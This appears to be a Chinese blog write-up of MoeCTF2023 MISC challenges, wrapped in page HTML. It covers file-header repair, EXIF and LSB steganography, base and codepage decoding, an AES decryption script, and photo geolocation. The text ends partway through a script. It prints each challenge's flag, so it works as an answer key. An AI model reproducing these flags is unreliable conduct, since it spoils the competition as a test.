+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696051825098-977e5669-904e-4ca3-9510-da442dd43f2c.png#averageHue=%23141212&clientId=u0b43effb-f7cd-4&from=paste&height=392&id=u5a4e3d52&originHeight=981&originWidth=621&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=64214&status=done&style=none&taskId=u680be62e-65de-4755-ac68-33ee34f1c90&title=&width=248.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696051897156-c0266070-a939-4bfb-bf0c-532475a07bcc.png#averageHue=%23100f0f&clientId=u0b43effb-f7cd-4&from=paste&height=54&id=uc19d3a51&originHeight=134&originWidth=3796&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=35700&status=done&style=none&taskId=u7953faca-5e2b-4700-8c62-9e1b8d8828e&title=&width=1518.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696051912788-47f377cc-4150-4e3d-a239-986355d526db.png#averageHue=%23131212&clientId=u0b43effb-f7cd-4&from=paste&height=184&id=u8c22864c&originHeight=461&originWidth=596&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=23428&status=done&style=none&taskId=ua99d4bd6-8ebd-445d-9db9-7825accb220&title=&width=238.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696051981633-36ccd3ae-231b-4bd1-ae4e-f8a9c535159c.png#averageHue=%230f0e0e&clientId=u0b43effb-f7cd-4&from=paste&height=80&id=u69f510b6&originHeight=199&originWidth=3796&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=50035&status=done&style=none&taskId=uc969e655-7800-43e6-b427-769bbfe5cf1&title=&width=1518.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696052000303-da4526ec-9ef9-4161-93b3-74d1222e4704.png#averageHue=%23111110&clientId=u0b43effb-f7cd-4&from=paste&height=204&id=u18a90143&originHeight=509&originWidth=1534&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=40658&status=done&style=none&taskId=ubdf4e306-add0-42fd-94b5-9c6502ea54c&title=&width=613.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1691994150985-9f528c42-81a8-4af0-893e-9afc3e8e8079.png#averageHue=%23252524&clientId=u6a837453-95fb-4&from=paste&height=535&id=u29b877aa&originHeight=1338&originWidth=2075&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=130911&status=done&style=none&taskId=u4e20526d-471a-42cf-9f2f-2510b4432d3&title=&width=830">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1691994613924-3c0f4c3c-eda3-411d-a420-594a8ee36822.png#averageHue=%23242732&clientId=u6a837453-95fb-4&from=paste&height=809&id=uc097c576&originHeight=2023&originWidth=3470&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=1251136&status=done&style=none&taskId=uffcf73db-8a41-4689-a11d-50c782e0b20&title=&width=1388">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696693623229-70dd9583-aabc-4d92-a605-42ad8fe24427.png#averageHue=%23252833&clientId=u169ae2ec-159c-4&from=paste&height=808&id=uc0a0f389&originHeight=2021&originWidth=3346&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=1223293&status=done&style=none&taskId=u6d090091-5fe9-42e5-ae3c-3456a116b8f&title=&width=1338.4">
+<meta property="article:published_time" content="2023-10-13T15:00:14.331Z">
+<meta property="article:modified_time" content="2023-10-15T13:24:51.772Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1691993216086-1375fd6c-34f8-40d1-95aa-6ed9424f8e6a.png#averageHue=%23f7f7f7&clientId=u6a837453-95fb-4&from=paste&height=747&id=u5eab977e&originHeight=1868&originWidth=3660&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=298182&status=done&style=none&taskId=u129acc36-3ce3-4c56-ad4d-854c39dd59f&title=&width=1464">
+  
+  
+  
+  <title>W火火</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>W火火</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-13 23:00" pubdate>
+          2023年10月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          23k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          196 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="MoeCTF2023"><a href="#MoeCTF2023" class="headerlink" title="MoeCTF2023"></a>MoeCTF2023</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="MISC入门指北"><a href="#MISC入门指北" class="headerlink" title="MISC入门指北"></a>MISC入门指北</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1691993216086-1375fd6c-34f8-40d1-95aa-6ed9424f8e6a.png#averageHue=%23f7f7f7&clientId=u6a837453-95fb-4&from=paste&height=747&id=u5eab977e&originHeight=1868&originWidth=3660&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=298182&status=done&style=none&taskId=u129acc36-3ce3-4c56-ad4d-854c39dd59f&title=&width=1464" srcset="/img/loading.gif" lazyload alt="image.png"><br>bW9lY3Rme2hAdjNfZnVuX0B0X20xNWNfIX0&#x3D;<br><code>moectf&#123;h@v3_fun_@t_m15c_!&#125;</code></p>
+<h2 id="打不开的图片1"><a href="#打不开的图片1" class="headerlink" title="打不开的图片1"></a>打不开的图片1</h2><p>010查看发现文件头不是ffd8<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1691993347738-844e20e3-22c6-4454-8b22-56ecd9909969.png#averageHue=%2337352f&clientId=u6a837453-95fb-4&from=paste&height=803&id=u04e26fa8&originHeight=2008&originWidth=2978&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=493760&status=done&style=none&taskId=u58d6478c-983d-48a1-8c18-fba73565bc4&title=&width=1191.2" srcset="/img/loading.gif" lazyload alt="image.png"><br>修改文件头ffd8保存<br>查看exif属性<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1691993388329-a26c6334-46f9-413d-93ff-b2a92437703d.png#averageHue=%23f5f4f1&clientId=u6a837453-95fb-4&from=paste&height=579&id=u8404ab0d&originHeight=1448&originWidth=2013&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=362820&status=done&style=none&taskId=u9b7fa86b-1732-430c-a662-c8c6df31eea&title=&width=805.2" srcset="/img/loading.gif" lazyload alt="image.png"><br>6d6f656374667b5844555f69355f763372795f3665407532696675317d<br>cyberchef<br><code>moectf&#123;XDU_i5_v3ry_6e@u2ifu1&#125;</code></p>
+<h2 id="打不开的图片2"><a href="#打不开的图片2" class="headerlink" title="打不开的图片2"></a>打不开的图片2</h2><p>题目提示牛头不对马嘴<br>jpg后缀010查看发现是png文件尾<br>把文件头改成89 50 4e 47 0d 0a 1a 0a<img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1691995132280-956eb309-6099-42e7-9375-3a5810213393.png#averageHue=%23d1d7cc&clientId=u13932080-eb19-4&from=paste&height=487&id=u0980b8c7&originHeight=1218&originWidth=2145&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=3232542&status=done&style=none&taskId=ub281c789-df3d-4fc8-b82b-62285d2680e&title=&width=858" srcset="/img/loading.gif" lazyload alt="1691995123538.png"><br><code>moectf&#123;D0_yOu_1ik3_Bo7@ck_?&#125;</code></p>
+<h2 id="狗子（1）普通的猫"><a href="#狗子（1）普通的猫" class="headerlink" title="狗子（1）普通的猫"></a>狗子（1）普通的猫</h2><p>给了一个wav文件，听不出来啥<br>看题目010查看<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1691997020619-424fbe21-92b6-4193-b9eb-d24e32ad6935.png#averageHue=%23484742&clientId=u13932080-eb19-4&from=paste&height=803&id=ub75794c2&originHeight=2008&originWidth=2978&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=554711&status=done&style=none&taskId=uc17a2602-9d06-4d1f-a1c2-29bf342e409&title=&width=1191.2" srcset="/img/loading.gif" lazyload alt="image.png"><br><code>moectf&#123;eeeez_f1ag_as_A_G1ft!&#125;</code></p>
+<h2 id="building-near-lake"><a href="#building-near-lake" class="headerlink" title="building_near_lake"></a>building_near_lake</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692083562915-ee708dff-8273-4c38-b8b2-a5dcdd4bdc6c.png#averageHue=%239c9ca0&clientId=u7da1720a-a5bf-4&from=paste&height=926&id=uce35b96c&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=707739&status=done&style=none&taskId=u8a411af7-1d05-47de-80ae-3bb4462cebb&title=&width=1536" srcset="/img/loading.gif" lazyload alt="1692083546327.png"><br><code>moectf&#123;P0sT_Y0uR_Ph0T0_wiTh_0Riginal_File_is_n0T_a_g00d_idea_YlJf!M3rux&#125;</code></p>
+<h2 id="烫烫烫"><a href="#烫烫烫" class="headerlink" title="烫烫烫"></a>烫烫烫</h2><p>UTF-8查看是<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692084110065-17811044-e2f7-4ebd-8ef6-7614130c213a.png#averageHue=%231e1e1e&clientId=u7da1720a-a5bf-4&from=paste&height=920&id=u87f480f4&originHeight=2300&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=501352&status=done&style=none&taskId=u01ccf1b2-2634-404f-99e6-df94ba358c3&title=&width=1536" srcset="/img/loading.gif" lazyload alt="image.png"><br>大厨中使用utf-7查看</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm">这是你的flag：<br><br>a<span class="hljs-number">9736</span>d<span class="hljs-number">8</span>ad<span class="hljs-number">21107398</span>b<span class="hljs-number">73324694</span>cbcd<span class="hljs-number">11</span>f<span class="hljs-number">66e3</span>befe<span class="hljs-number">67016</span>def<span class="hljs-number">21</span>dcaa<span class="hljs-number">9</span>ab<span class="hljs-number">143</span>bc<span class="hljs-number">4405</span>be<span class="hljs-number">596245361</span>f<span class="hljs-number">98</span>db<span class="hljs-number">6</span>a<span class="hljs-number">0047</span>b<span class="hljs-number">4</span>be<span class="hljs-number">78</span>ede<span class="hljs-number">40864</span>eb<span class="hljs-number">988</span>d<span class="hljs-number">8</span>a<span class="hljs-number">4999</span>cdcb<span class="hljs-number">31592</span>fd<span class="hljs-number">42</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>b<span class="hljs-number">73</span>df<span class="hljs-number">3</span>b<span class="hljs-number">492403</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>a<span class="hljs-number">379</span>a<span class="hljs-number">9</span>ff<span class="hljs-number">5e81262</span><br><br>但是flag用AES加密了，key是下面这行字的sha<span class="hljs-number">256</span>（hash值的开头是b<span class="hljs-number">34</span>edc<span class="hljs-number">782</span>d<span class="hljs-number">68</span>fda<span class="hljs-number">34</span>dc<span class="hljs-number">23329</span>）<br><br>所以说，codepage真的很重要啊（<br></code></pre></td></tr></table></figure>
+<p>gpt写Python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">import</span> binascii<br><br>encrypted_flag = <span class="hljs-string">&quot;a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262&quot;</span><br>key_string = <span class="hljs-string">&quot;所以说，codepage真的很重要啊（&quot;</span><br><br><span class="hljs-comment"># 计算密钥</span><br>key = hashlib.sha256(key_string.encode()).digest()[:<span class="hljs-number">32</span>]<br><br><span class="hljs-comment"># 解密操作</span><br>cipher = AES.new(key, AES.MODE_ECB)<br>encrypted_data = binascii.unhexlify(encrypted_flag)<br>decrypted_data = cipher.decrypt(encrypted_data)<br>unpadded_data = unpad(decrypted_data, AES.block_size)<br><br><span class="hljs-comment"># 输出解密结果</span><br>flag = unpadded_data.decode()<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692084285031-bbefa158-13ed-417f-8e17-21e6cf0eb0e6.png#averageHue=%231e1e1e&clientId=u7da1720a-a5bf-4&from=paste&height=920&id=u2a95398d&originHeight=2300&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=582785&status=done&style=none&taskId=u97bd10d4-edad-4cb3-813d-6178e179cc9&title=&width=1536" srcset="/img/loading.gif" lazyload alt="image.png"><br><code>moectf&#123;codep@ge_pl@ys_@n_iMport@nt_role_in_intern@tion@liz@tion_g92WPIB&#125;</code></p>
+<h2 id="狗子-2-照片"><a href="#狗子-2-照片" class="headerlink" title="狗子(2) 照片"></a>狗子(2) 照片</h2><p>给了照片说是隐写<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692151255848-b3776ddd-2113-411e-8c8b-c7f462b8d004.png#averageHue=%23262626&clientId=uf860b47c-a3c5-4&from=paste&height=319&id=u5367fd2c&originHeight=798&originWidth=1955&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=232221&status=done&style=none&taskId=u1841aec4-1d74-4db8-83f6-a38439bce66&title=&width=782" srcset="/img/loading.gif" lazyload alt="image.png"><br>去使用zsteg<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692151235933-0e8dc1d5-8118-4bea-9d9a-925df099190d.png#averageHue=%23242732&clientId=uf860b47c-a3c5-4&from=paste&height=809&id=ud1003ac2&originHeight=2023&originWidth=3470&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=1365313&status=done&style=none&taskId=u01cf8aad-ea18-4fa7-b190-991a93c6e78&title=&width=1388" srcset="/img/loading.gif" lazyload alt="image.png"><br><code>moectf&#123;D0ggy_H1dd3n_1n_Pho7o_With_LSB!&#125;</code></p>
+<h2 id="base乐队"><a href="#base乐队" class="headerlink" title="base乐队"></a>base乐队</h2><p>题目描述<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692103198101-bf074f12-297b-4f95-9d77-74fad865afbf.png#averageHue=%23212121&clientId=u802f4833-c821-4&from=paste&height=91&id=u8ae6237f&originHeight=228&originWidth=1700&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=28433&status=done&style=none&taskId=u7c9be098-3fa4-4bc4-a595-e891fe78a61&title=&width=680" srcset="/img/loading.gif" lazyload alt="1692103189870.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692103441836-c45be622-9241-42fa-ba38-9be30b5fa52a.png#averageHue=%23faf9f8&clientId=u802f4833-c821-4&from=paste&height=64&id=uc6a46804&originHeight=160&originWidth=1268&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=32109&status=done&style=none&taskId=u63b47b65-aa9f-4ad4-a51e-2f434364b35&title=&width=507.2" srcset="/img/loading.gif" lazyload alt="1692103436867.png"><br>说明不止一种解密方式<br>给了一串</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">HFUEULC5HEZG42DGHFGDWSCTHRCUIUSVHFGDWS2EGZMCCRDKG5XG2LDEHFUTYYZGHJSUMKKDGVZDELBRHBIW4UCQGZLGOP2SHEYV44ZOHEZFYXCZHEYUIV2VGEXVK4KRHBWFWY2OHVMWSYCKG5XFCZTBHEZC6I2WHJST2ZK4HEXTSMDSHA3CKZRZGRNHI4LL<br></code></pre></td></tr></table></figure>
+<p>大厨解到底<br><code>bYeNQXYZXbXZQfW31FGzzD0m0FHQ9RR85FFQYMB9M=lmo2ku11z0uiz=</code><br>有两个等号，所以应该是经过栅栏密码重组了<br>随波逐流解一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692103145513-5bbd3852-22da-491c-b8b8-b1bf587ae591.png#averageHue=%23f1f1f1&clientId=u802f4833-c821-4&from=paste&height=847&id=ue3268263&originHeight=2118&originWidth=2040&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=392131&status=done&style=none&taskId=uf711bdfb-b2d7-46bb-899f-6cb3bac0e14&title=&width=816" srcset="/img/loading.gif" lazyload alt="image.png"><br><code>bW9lY3Rme1RoNF82QG5kXzFuYzF1ZDQ1X0YzbmM0X0BuZF9iQHMzfQ==</code><br>再去大厨解<br><code>moectf&#123;Th4_6@nd_1nc1ud45_F3nc4_@nd_b@s3&#125;</code></p>
+<h2 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h2><p>给了一个flag.zip<br>010查看发现是ppt<br>后缀改成ppt<br>可能是隐写<br>ctrl+A修改字体颜色<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692091108119-bdfc1125-2544-4987-b997-bcc88fdec304.png#averageHue=%23f0efef&clientId=u802f4833-c821-4&from=paste&height=776&id=u5bcbd4dd&originHeight=1940&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=109162&status=done&style=none&taskId=u8f179507-ab41-46c2-b598-34bce661f5a&title=&width=1536" srcset="/img/loading.gif" lazyload alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692091113101-acd1a708-bd6a-4c62-85ad-fab80139b5b8.png#averageHue=%23f0efef&clientId=u802f4833-c821-4&from=paste&height=776&id=u323e6f86&originHeight=1940&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=134948&status=done&style=none&taskId=u01e2b44c-f0a3-4f73-85dc-d3b9bafdf5b&title=&width=1536" srcset="/img/loading.gif" lazyload alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692091136677-01814bc1-80ff-4a17-a6c6-37a008914dec.png#averageHue=%23eae4e2&clientId=u802f4833-c821-4&from=paste&height=854&id=u186aac59&originHeight=2135&originWidth=3728&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=505516&status=done&style=none&taskId=ud10ad6e1-b761-4fcc-8896-3da9f522884&title=&width=1491.2" srcset="/img/loading.gif" lazyload alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692091152936-69451fce-d900-42bf-b2d1-5b655f71d40d.png#averageHue=%23f0f0f0&clientId=u802f4833-c821-4&from=paste&height=776&id=uc2a7a231&originHeight=1940&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=111358&status=done&style=none&taskId=ued6cf01a-f69c-4da3-a980-88fcb656217&title=&width=1536" srcset="/img/loading.gif" lazyload alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692091165008-ed7a438e-f5c6-4f8a-8985-94a7191ee26e.png#averageHue=%23f0efef&clientId=u802f4833-c821-4&from=paste&height=776&id=uabad8e4d&originHeight=1940&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=329165&status=done&style=none&taskId=u34d7f2db-8a3a-4974-bb22-d35fcf798f3&title=&width=1536" srcset="/img/loading.gif" lazyload alt="image.png"><br>询问管理员才发现 2345每张ppt都有且仅有一个flag的片段   有一个片段是坑<br><code>moectf&#123;2ip_?_n0_i4_pp4x!&#125;</code></p>
+<h2 id="机位查询"><a href="#机位查询" class="headerlink" title="机位查询"></a>机位查询</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692196893041-c6cc31e7-c968-4539-a799-47b887810480.png#averageHue=%2353513f&clientId=ud1d0d7ad-59ad-4&from=paste&height=776&id=u9db2883a&originHeight=1940&originWidth=1463&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=4304406&status=done&style=none&taskId=ue6d6ff90-e0b6-49f0-a612-9d15d9763b3&title=&width=585.2" srcset="/img/loading.gif" lazyload alt="image.png"><br>嘉士摩根国际<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692196906547-d3260e64-d8ed-458b-8ce4-62e0cf476a22.png#averageHue=%233f4d5e&clientId=ud1d0d7ad-59ad-4&from=paste&height=768&id=ue36bfd96&originHeight=1920&originWidth=1089&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=3560328&status=done&style=none&taskId=u81c90f32-6b6f-4fe8-a7af-d7e3ca294ac&title=&width=435.6" srcset="/img/loading.gif" lazyload alt="image.png"><br>百盛步行街广场<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692196954933-9fcf30ad-425b-4e08-95c8-24ed5cfeeedf.png#averageHue=%23424846&clientId=ud1d0d7ad-59ad-4&from=paste&height=516&id=u0bdd38a4&originHeight=1290&originWidth=1726&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=2733560&status=done&style=none&taskId=u1007fd5b-af94-403b-8ce3-a5598cd322d&title=&width=690.4" srcset="/img/loading.gif" lazyload alt="image.png"><br>p3有经纬度<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692196989445-58de6dea-d937-45da-ac66-71cb87fb2eb1.png#averageHue=%23f5f4f3&clientId=ud1d0d7ad-59ad-4&from=paste&height=82&id=ufabf10b5&originHeight=204&originWidth=782&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=13408&status=done&style=none&taskId=u0af6e9e8-5902-40e7-97c6-04fbdabc27d&title=&width=312.8" srcset="/img/loading.gif" lazyload alt="image.png"><br>108.359167<br>22.813431<br>GPS查询发现在南湖试了试不对<br>人工爆破周围地区都是错的<br>可能是GPS有偏移<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692197114226-b3c60cce-bdf0-4dbd-8c4b-7d8888835c47.png#averageHue=%23f7eedb&clientId=ud1d0d7ad-59ad-4&from=paste&height=602&id=u9e1a695b&originHeight=1506&originWidth=3358&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=807384&status=done&style=none&taskId=u02ff1f87-2d5a-4f11-9247-4bc5355191e&title=&width=1343.2" srcset="/img/loading.gif" lazyload alt="image.png"><br>查看原始GPS<br><code>moectf&#123;jiashi_baisheng_huijin&#125;</code></p>
+<h2 id="狗子（3）寝室"><a href="#狗子（3）寝室" class="headerlink" title="狗子（3）寝室"></a>狗子（3）寝室</h2><p>10000层压缩包嵌套，而且每次的压缩方法具有随机性</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> shutil<br><span class="hljs-keyword">import</span> py7zr<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> 